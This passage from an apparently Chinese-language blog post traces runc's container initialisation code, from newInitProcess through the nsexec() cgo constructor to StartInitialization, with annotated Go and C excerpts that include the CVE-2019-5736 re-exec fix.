    <span class="nx">logFilePair</span> <span class="o">:=</span> <span class="nx">filePair</span><span class="p">{</span><span class="nx">parentLogPipe</span><span class="p">,</span> <span class="nx">childLogPipe</span><span class="p">}</span>

    <span class="c1">//通过pipe获取cmd
</span><span class="c1"></span>    <span class="nx">cmd</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">commandTemplate</span><span class="p">(</span><span class="nx">p</span><span class="p">,</span> <span class="nx">childInitPipe</span><span class="p">,</span> <span class="nx">childLogPipe</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">!</span><span class="nx">p</span><span class="p">.</span><span class="nx">Init</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nf">newSetnsProcess</span><span class="p">(</span><span class="nx">p</span><span class="p">,</span> <span class="nx">cmd</span><span class="p">,</span> <span class="nx">messageSockPair</span><span class="p">,</span> <span class="nx">logFilePair</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="c1">// We only set up fifoFd if we&#39;re not doing a `runc exec`. The historic
</span><span class="c1"></span>    <span class="c1">// reason for this is that previously we would pass a dirfd that allowed
</span><span class="c1"></span>    <span class="c1">// for container rootfs escape (and not doing it in `runc exec` avoided
</span><span class="c1"></span>    <span class="c1">// that problem), but we no longer do that. However, there&#39;s no need to do
</span><span class="c1"></span>    <span class="c1">// this for `runc exec` so we just keep it this way to be safe.
</span><span class="c1"></span>    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">includeExecFifo</span><span class="p">(</span><span class="nx">cmd</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nf">newSystemErrorWithCause</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;including execfifo in cmd.Exec setup&#34;</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="c1">//执行newInitProcess()，返回进程对象
</span><span class="c1"></span>    <span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nf">newInitProcess</span><span class="p">(</span><span class="nx">p</span><span class="p">,</span> <span class="nx">cmd</span><span class="p">,</span> <span class="nx">messageSockPair</span><span class="p">,</span> <span class="nx">logFilePair</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>接下来分析<code>linuxContainer.newInitProcess()</code>函数(<code>libcontainer/container_linux.go#540</code>)。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">linuxContainer</span><span class="p">)</span> <span class="nf">newInitProcess</span><span class="p">(</span><span class="nx">p</span> <span class="o">*</span><span class="nx">Process</span><span class="p">,</span> <span class="nx">cmd</span> <span class="o">*</span><span class="nx">exec</span><span class="p">.</span><span class="nx">Cmd</span><span class="p">,</span> <span class="nx">messageSockPair</span><span class="p">,</span> <span class="nx">logFilePair</span> <span class="nx">filePair</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="nx">initProcess</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">cmd</span><span class="p">.</span><span class="nx">Env</span> <span class="p">=</span> <span class="nb">append</span><span class="p">(</span><span class="nx">cmd</span><span class="p">.</span><span class="nx">Env</span><span class="p">,</span> <span class="s">&#34;_LIBCONTAINER_INITTYPE=&#34;</span><span class="o">+</span><span class="nb">string</span><span class="p">(</span><span class="nx">initStandard</span><span class="p">))</span>
    <span class="nx">nsMaps</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">map</span><span class="p">[</span><span class="nx">configs</span><span class="p">.</span><span class="nx">NamespaceType</span><span class="p">]</span><span class="kt">string</span><span class="p">)</span>
    <span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">ns</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">c</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Namespaces</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nx">ns</span><span class="p">.</span><span class="nx">Path</span> <span class="o">!=</span> <span class="s">&#34;&#34;</span> <span class="p">{</span>
            <span class="nx">nsMaps</span><span class="p">[</span><span class="nx">ns</span><span class="p">.</span><span class="nx">Type</span><span class="p">]</span> <span class="p">=</span> <span class="nx">ns</span><span class="p">.</span><span class="nx">Path</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">_</span><span class="p">,</span> <span class="nx">sharePidns</span> <span class="o">:=</span> <span class="nx">nsMaps</span><span class="p">[</span><span class="nx">configs</span><span class="p">.</span><span class="nx">NEWPID</span><span class="p">]</span>
    <span class="nx">data</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">bootstrapData</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Namespaces</span><span class="p">.</span><span class="nf">CloneFlags</span><span class="p">(),</span> <span class="nx">nsMaps</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">err</span>
    <span class="p">}</span>
    <span class="nx">init</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">initProcess</span><span class="p">{</span>
        <span class="nx">cmd</span><span class="p">:</span>             <span class="nx">cmd</span><span class="p">,</span>
        <span class="nx">messageSockPair</span><span class="p">:</span> <span class="nx">messageSockPair</span><span class="p">,</span>
        <span class="nx">logFilePair</span><span class="p">:</span>     <span class="nx">logFilePair</span><span class="p">,</span>
        <span class="nx">manager</span><span class="p">:</span>         <span class="nx">c</span><span class="p">.</span><span class="nx">cgroupManager</span><span class="p">,</span>
        <span class="nx">intelRdtManager</span><span class="p">:</span> <span class="nx">c</span><span class="p">.</span><span class="nx">intelRdtManager</span><span class="p">,</span>
        <span class="nx">config</span><span class="p">:</span>          <span class="nx">c</span><span class="p">.</span><span class="nf">newInitConfig</span><span class="p">(</span><span class="nx">p</span><span class="p">),</span>
        <span class="nx">container</span><span class="p">:</span>       <span class="nx">c</span><span class="p">,</span>
        <span class="nx">process</span><span class="p">:</span>         <span class="nx">p</span><span class="p">,</span>
        <span class="nx">bootstrapData</span><span class="p">:</span>   <span class="nx">data</span><span class="p">,</span>
        <span class="nx">sharePidns</span><span class="p">:</span>      <span class="nx">sharePidns</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="nx">c</span><span class="p">.</span><span class="nx">initProcess</span> <span class="p">=</span> <span class="nx">init</span>
    <span class="k">return</span> <span class="nx">init</span><span class="p">,</span> <span class="kc">nil</span>
    <span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>该函数创建<code>initProcess</code>类型对象并返回，所以<code>linuxContainer.start()</code>函数定义中的<code>parent</code>变量是<code>initProcess</code>类型，所以<code>parent.start()</code>调用的是<code>initProcess.start()</code>方法。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="p">(</span><span class="nx">p</span> <span class="o">*</span><span class="nx">initProcess</span><span class="p">)</span> <span class="nf">start</span><span class="p">()</span> <span class="p">(</span><span class="nx">retErr</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">defer</span> <span class="nx">p</span><span class="p">.</span><span class="nx">messageSockPair</span><span class="p">.</span><span class="nx">parent</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
    <span class="c1">//启动runc init命令
</span><span class="c1"></span>    <span class="nx">err</span> <span class="o">:=</span> <span class="nx">p</span><span class="p">.</span><span class="nx">cmd</span><span class="p">.</span><span class="nf">Start</span><span class="p">()</span>
    <span class="o">...</span>
    <span class="c1">//向parentPipe中写入bootstrapData，供runc init子进程读取
</span><span class="c1"></span>    <span class="k">if</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">io</span><span class="p">.</span><span class="nf">Copy</span><span class="p">(</span><span class="nx">p</span><span class="p">.</span><span class="nx">messageSockPair</span><span class="p">.</span><span class="nx">parent</span><span class="p">,</span> <span class="nx">p</span><span class="p">.</span><span class="nx">bootstrapData</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
    	<span class="k">return</span> <span class="nf">newSystemErrorWithCause</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;copying bootstrap data to pipe&#34;</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="o">...</span>
    <span class="c1">//parseSync等待子进程回应
</span><span class="c1"></span>    <span class="nx">ierr</span> <span class="o">:=</span> <span class="nf">parseSync</span><span class="p">(</span><span class="nx">p</span><span class="p">.</span><span class="nx">messageSockPair</span><span class="p">.</span><span class="nx">parent</span><span class="p">,</span> <span class="kd">func</span><span class="p">(</span><span class="nx">sync</span> <span class="o">*</span><span class="nx">syncT</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
        <span class="o">...</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>该函数会启动<code>runc init</code>进程，并且等待子进程返回。</p>
<p>runc init指令被执行。<code>init.go</code>文件中引入了<code>nsenter</code>包，因此由于CGO的特性，以及<code>__attribute__((constructor))</code>修饰语，所以<code>nsexec()</code>函数会首先被执行，然后再执行<code>init.go</code>中的<code>StartInitialization()</code>函数。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">// +build linux,!gccgo
</span><span class="c1"></span>
<span class="kn">package</span> <span class="nx">nsenter</span>

<span class="cm">/*
</span><span class="cm">#cgo CFLAGS: -Wall
</span><span class="cm">extern void nsexec();
</span><span class="cm">void __attribute__((constructor)) init(void) {
</span><span class="cm">	nsexec();
</span><span class="cm">}
</span><span class="cm">*/</span>
<span class="kn">import</span> <span class="s">&#34;C&#34;</span>

</code></pre></td></tr></table>
</div>
</div><p>nsexec()函数(<code>libcontainer/nsenter/nsexec.c#602</code>)会通过环境变量获取pipe描述符</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">nsexec</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">pipenum</span><span class="p">;</span>
    <span class="n">jmp_buf</span> <span class="n">env</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">sync_child_pipe</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">sync_grandchild_pipe</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
    <span class="k">struct</span> <span class="n">nlconfig_t</span> <span class="n">config</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>

    <span class="cm">/*
</span><span class="cm">     * Setup a pipe to send logs to the parent. This should happen
</span><span class="cm">     * first, because bail will use that pipe.
</span><span class="cm">     */</span>
     <span class="c1">//根据环境变量获取pipe
</span><span class="c1"></span>    <span class="n">setup_logpipe</span><span class="p">();</span>

    <span class="cm">/*
</span><span class="cm">     * If we don&#39;t have an init pipe, just return to the go routine.
</span><span class="cm">     * We&#39;ll only get an init pipe for start or exec.
</span><span class="cm">     */</span>
    <span class="n">pipenum</span> <span class="o">=</span> <span class="n">initpipe</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">pipenum</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        <span class="k">return</span><span class="p">;</span>

    <span class="cm">/*
</span><span class="cm">     * We need to re-exec if we are not in a cloned binary. This is necessary
</span><span class="cm">     * to ensure that containers won&#39;t be able to access the host binary
</span><span class="cm">     * through /proc/self/exe. See CVE-2019-5736.
</span><span class="cm">     */</span>
     <span class="c1">//新增的修复代码，确保当前的二进制文件是已经复制过的，并且不是runc自身
</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">ensure_cloned_binary</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">bail</span><span class="p">(</span><span class="s">&#34;could not ensure we are a cloned binary&#34;</span><span class="p">);</span>
    <span class="p">...</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>init.go</code>中的Action定义为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">var</span> <span class="nx">initCommand</span> <span class="p">=</span> <span class="nx">cli</span><span class="p">.</span><span class="nx">Command</span><span class="p">{</span>
    <span class="nx">Name</span><span class="p">:</span>  <span class="s">&#34;init&#34;</span><span class="p">,</span>
    <span class="nx">Usage</span><span class="p">:</span> <span class="s">`initialize the namespaces and launch the process (do not call it outside of runc)`</span><span class="p">,</span>
    <span class="nx">Action</span><span class="p">:</span> <span class="kd">func</span><span class="p">(</span><span class="nx">context</span> <span class="o">*</span><span class="nx">cli</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
        <span class="nx">factory</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">libcontainer</span><span class="p">.</span><span class="nf">New</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">)</span>
        <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">factory</span><span class="p">.</span><span class="nf">StartInitialization</span><span class="p">();</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="c1">// as the error is sent back to the parent there is no need to log
</span><span class="c1"></span>            <span class="c1">// or write it to stderr because the parent process will handle this
</span><span class="c1"></span>            <span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="p">}</span>
        <span class="nb">panic</span><span class="p">(</span><span class="s">&#34;libcontainer: container init failed to exec&#34;</span><span class="p">)</span>
    <span class="p">},</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>libcontainer.New(&quot;&quot;)</code>返回一个空的<code>linuxFactory</code>类型对象，因此这里会执行<code>linuxFactory</code>实现的<code>StartInitialization()</code>方法</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">// StartInitialization loads a container by opening the pipe fd from the parent to read the configuration and state
</span><span class="c1">// This is a low level implementation detail of the reexec and should not be consumed externally
</span><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">l</span> <span class="o">*</span><span class="nx">LinuxFactory</span><span class="p">)</span> <span class="nf">StartInitialization</span><span class="p">()</span> <span class="p">(</span><span class="nx">err</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
	<span class="c1">// Get the INITPIPE.
</span><span class="c1"></span>	<span class="nx">envInitPipe</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Getenv</span><span class="p">(</span><span class="s">&#34;_LIBCONTAINER_INITPIPE&#34;</span><span class="p">)</span>
	<span class="nx">pipefd</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">strconv</span><span class="p">.</span><span class="nf">Atoi</span><span class="p">(</span><span class="nx">envInitPipe</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="k">return</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="s">&#34;unable to convert _LIBCONTAINER_INITPIPE=%s to int: %s&#34;</span><span class="p">,</span> <span class="nx">envInitPipe</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="nx">pipe</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">NewFile</span><span class="p">(</span><span class="nb">uintptr</span><span class="p">(</span><span class="nx">pipefd</span><span class="p">),</span> <span class="s">&#34;pipe&#34;</span><span class="p">)</span>
	<span class="k">defer</span> <span class="nx">pipe</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>

	<span class="c1">// Only init processes have FIFOFD.
</span><span class="c1"></span>	<span class="nx">fifofd</span> <span class="o">:=</span> <span class="o">-</span><span class="mi">1</span>
	<span class="nx">envInitType</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Getenv</span><span class="p">(</span><span class="s">&#34;_LIBCONTAINER_INITTYPE&#34;</span><span class="p">)</span>
	<span class="nx">it</span> <span class="o">:=</span> <span class="nf">initType</span><span class="p">(</span><span class="nx">envInitType</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">it</span> <span class="o">==</span> <span class="nx">initStandard</span> <span class="p">{</span>
		<span class="nx">envFifoFd</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Getenv</span><span class="p">(</span><span class="s">&#34;_LIBCONTAINER_FIFOFD&#34;</span><span class="p">)</span>
		<span class="k">if</span> <span class="nx">fifofd</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">strconv</span><span class="p">.</span><span class="nf">Atoi</span><span class="p">(</span><span class="nx">envFifoFd</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
			<span class="k">return</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="s">&#34;unable to convert _LIBCONTAINER_FIFOFD=%s to int: %s&#34;</span><span class="p">,</span> <span class="nx">envFifoFd</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
		<span class="p">}</span>
	<span class="p">}</span>

    <span class="o">...</span>

    <span class="nx">i</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">newContainerInit</span><span class="p">(</span><span class="nx">it</span><span class="p">,</span> <span class="nx">pipe</span><span class="p">,</span> <span class="nx">consoleSocket</span><span class="p">,</span> <span class="nx">fifofd</span><span class="p">,</span> <span class="nx">logPipeFd</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">err</span>
    <span class="p">}</span>

    <span class="c1">// If Init succeeds, syscall.Exec will not return, hence none of the defers will be called.
</span><span class="c1"></span>    <span class="k">return</span> <span class="nx">i</span><span class="p">.</span><span class="nf">Init</span><span class="p">()</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>StartInitialization()</code>完成以下步骤</p>
<ul>
<li>
<p>从环境变量中获取pipe管道描述符(<code>_LIBCONTAINER_INITPIPE</code>)、init type(<code>_LIBCONTAINER_INITTYPE</code>)</p>
</li>
<li>
<p>执行<code>newContainerInit()</code>函数，由于之前<code>newInitProcess()</code>函数中设置了环境变量为<code>&quot;standard&quot;</code>，所以这里<code>newContainerInit()</code>函数会创建<code>linuxStandardInit</code>类型对象并返回</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">linuxContainer</span><span class="p">)</span> <span class="nf">newInitProcess</span><span class="p">(</span><span class="nx">p</span> <span class="o">*</span><span class="nx">Process</span><span class="p">,</span> <span class="nx">cmd</span> <span class="o">*</span><span class="nx">exec</span><span class="p">.</span><span class="nx">Cmd</span><span class="p">,</span> <span class="nx">messageSockPair</span><span class="p">,</span> <span class="nx">logFilePair</span> <span class="nx">filePair</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="nx">initProcess</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">cmd</span><span class="p">.</span><span class="nx">Env</span> <span class="p">=</span> <span class="nb">append</span><span class="p">(</span><span class="nx">cmd</span><span class="p">.</span><span class="nx">Env</span><span class="p">,</span> <span class="s">&#34;_LIBCONTAINER_INITTYPE=&#34;</span><span class="o">+</span><span class="nb">string</span><span class="p">(</span><span class="nx">initStandard</span><span class="p">))</span>
    <span class="o">...</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div></li>
</ul>
<p>接下来执行<code>linuxStandardInit</code>实现的<code>Init()</code>，该函数最终会将进程的命令替换为用户的命令（<code>unix.Exec(name, l.config.Args[0:], os.Environ())</code>）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
